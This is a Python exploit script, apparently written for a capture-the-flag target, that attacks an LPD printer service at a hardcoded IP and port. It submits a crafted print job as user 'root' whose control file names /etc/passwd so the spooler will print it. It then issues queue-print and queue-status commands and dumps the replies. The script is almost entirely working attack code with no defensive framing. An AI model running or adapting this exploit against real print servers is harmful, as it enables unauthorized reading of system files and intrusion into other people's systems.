#!/usr/bin/env python3
import socket
import time

TARGET = "94.237.49.23"
PORT = 37326

def send_cmd(data):
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(10)
        s.connect((TARGET, PORT))
        s.sendall(data)
        time.sleep(1)
        
        resp = b''
        s.settimeout(3)
        try:
            while True:
                chunk = s.recv(8192)
                if not chunk:
                    break
                resp += chunk
        except socket.timeout:
            pass
        
        s.close()
        return resp
    except Exception as e:
        return b''

# Paso 1: Crear un job con contenido específico
print("=== Step 1: Enviando job con archivo malicioso ===")
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(15)
s.connect((TARGET, PORT))

# Receive job
s.sendall(b'\x02lp\n')
time.sleep(0.3)
r1 = s.recv(1024)
print(f"ACK 1: {r1.hex()}")

# Control file - intentar que lea /etc/passwd
control = b"Uroot\nHlocalhost\nJ/etc/passwd\nN/etc/passwd\nl/etc/passwd\n"
s.sendall(b'\x02' + str(len(control)).encode() + b' cfA999test\n' + control + b'\x00')
time.sleep(0.3)
r2 = s.recv(1024)
print(f"ACK 2: {r2.hex()}")

# Data file vacío
s.sendall(b'\x030 dfA999test\n\x00')
time.sleep(0.3)
r3 = s.recv(1024)
print(f"ACK 3: {r3.hex()}")

s.close()

time.sleep(1)

# Paso 2: Intentar imprimir el job con comando 0x01
print("\n=== Step 2: Comando 0x01 (print any waiting jobs) ===")
resp = send_cmd(b'\x01lp\n')
print(f"Response length: {len(resp)}")
if len(resp) > 1:
    print(f"Hex: {resp[:200].hex()}")
    try:
        print(f"Text: {resp.decode('utf-8', errors='replace')[:500]}")
    except:
        pass

# Paso 3: Consultar cola después
print("\n=== Step 3: Consultar cola (long) ===")
resp = send_cmd(b'\x04lp\n')
print(f"Response length: {len(resp)}")
if len(resp) > 1:
    print(f"Text: {resp.decode('utf-8', errors='replace')[:500]}")

# Paso 4: Consultar con diferentes argumentos
print("\n=== Step 4: Consultar con usuario y job number ===")
resp = send_cmd(b'\x04lp root 999\n')
print(f"Response length: {len(resp)}")
if len(resp) > 1:
    print(f"Text: {resp.decode('utf-8', errors='replace')[:500]}")